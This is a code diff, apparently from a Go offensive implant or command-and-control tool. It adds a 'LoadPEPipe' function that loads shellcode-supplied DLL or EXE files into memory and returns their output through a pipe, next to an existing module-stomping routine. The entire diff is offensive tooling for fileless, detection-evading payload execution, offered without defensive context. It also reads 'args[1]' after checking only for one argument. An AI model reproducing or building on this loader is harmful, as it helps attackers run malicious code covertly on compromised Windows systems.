@@ -732,6 +732,38 @@ func ModuleStomp(shellcode []byte, addresstoinject string) (string, error) {
 	return "[+] Stomped.", nil
 }
 
+func LoadPEPipe(shellcode []byte, args []string) (string, error) {
+	if len(args) < 1 {
+		return "", errors.New("Not Enough Args.")
+	}
+	var t int
+	var exportToCall string
+	peType := args[0]
+	if peType == "dll" {
+		exportToCall = args[1]
+		if exportToCall == "" {
+			return "", errors.New("Export Function Not Provided In DLL Mode.")
+		}
+		t = 0
+	} else {
+		t = 1
+	}
+	if peloader.PeType(t) == peloader.Dll {
+		raw := peloader.NewRawPE(peloader.Dll, exportToCall, shellcode)
+		output, err := raw.LoadPEFromMemoryPipe() //
+		if err != nil {
+			return "", err
+		}
+		return output, nil
+	}
+	raw := peloader.NewRawPE(peloader.Exe, exportToCall, shellcode)
+	output, err := raw.LoadPEFromMemoryPipe() //
+	if err != nil {
+		return "", err
+	}
+	return output, nil
+}
+
 func LoadPE(shellcode []byte, args []string) (string, error) {
 	if len(args) < 1 {
 		return "", errors.New("Not Enough Args.")
@@ -750,14 +782,14 @@ func LoadPE(shellcode []byte, args []string) (string, error) {
 	}
 	if peloader.PeType(t) == peloader.Dll {
 		raw := peloader.NewRawPE(peloader.Dll, exportToCall, shellcode)
-		output, err := raw.LoadPEFromMemory()
+		output, err := raw.LoadPEFromMemory() //
 		if err != nil {
 			return "", err
 		}
 		return output, nil
 	}
 	raw := peloader.NewRawPE(peloader.Exe, exportToCall, shellcode)
-	output, err := raw.LoadPEFromMemory()
+	output, err := raw.LoadPEFromMemory() //
 	if err != nil {
 		return "", err
 	}
